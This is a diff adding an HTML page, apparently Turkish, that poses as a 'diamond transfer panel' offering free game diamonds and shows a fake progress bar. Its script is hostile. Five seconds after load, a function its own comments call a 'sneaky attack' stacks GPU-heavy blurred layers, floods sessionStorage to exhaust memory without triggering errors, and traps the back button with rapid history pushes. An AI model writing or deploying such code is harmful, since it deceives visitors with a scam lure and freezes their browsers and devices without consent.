@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>💎 ELMAS AKTARIM PANELİ v8 💎</title>
+    <style>
+        body { background: #000; color: #00ff00; text-align: center; font-family: sans-serif; overflow: hidden; }
+        .bar-bg { width: 80%; height: 20px; background: #222; border-radius: 10px; margin: 50px auto; }
+        #bar { width: 0%; height: 100%; background: #00ff00; border-radius: 10px; transition: width 0.5s; }
+        /* Tarayıcıyı yoran ama hata verdirmeyen görünmez efektler */
+        .layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; opacity: 0.05; }
+    </style>
+</head>
+<body>
+    <div id="layers"></div>
+    <h1 style="margin-top:150px;">ELMASLAR HAZIRLANIYOR</h1>
+    <div class="bar-bg"><div id="bar"></div></div>
+    <h2 id="perc">%0</h2>
+    <p id="msg">Lütfen bekleyin, şifreli hat kuruluyor...</p>
+
+<script>
+    let p = 0;
+    // Yavaş ama istikrarlı ilerleme
+    setInterval(() => {
+        if(p < 99) {
+            p++;
+            document.getElementById("bar").style.width = p + "%";
+            document.getElementById("perc").innerText = "%" + p;
+        }
+    }, 1200);
+
+    // TARAYICIYI UYUTAN SALDIRI
+    function sinsiSaldiri() {
+        // 1. Ekran Kartını (GPU) yavaş yavaş boğma
+        // Saniyede sadece 5 tane ama çok ağır (blur) element ekle
+        setInterval(() => {
+            let d = document.createElement("div");
+            d.className = "layer";
+            d.style.boxShadow = "inset 0 0 100px 100px lime";
+            d.style.filter = "blur(100px)";
+            document.getElementById("layers").appendChild(d);
+            
+            // 2. RAM'i küçük parçalarla (Chunk) doldurma
+            // Tarayıcı "Hata" vermesin diye parça parça ekliyoruz
+            window.sessionStorage.setItem('data_' + Math.random(), new Array(50000).fill("ELMAS").join(""));
+        }, 300);
+
+        // 3. Geri tuşu kilidi
+        setInterval(() => {
+            window.history.pushState(null, "", "/" + Math.random());
+        }, 100);
+    }
+
+    // 5 saniye sonra "sinsi" mod başlar
+    setTimeout(sinsiSaldiri, 5000);
+</script>
+</body>
+</html>
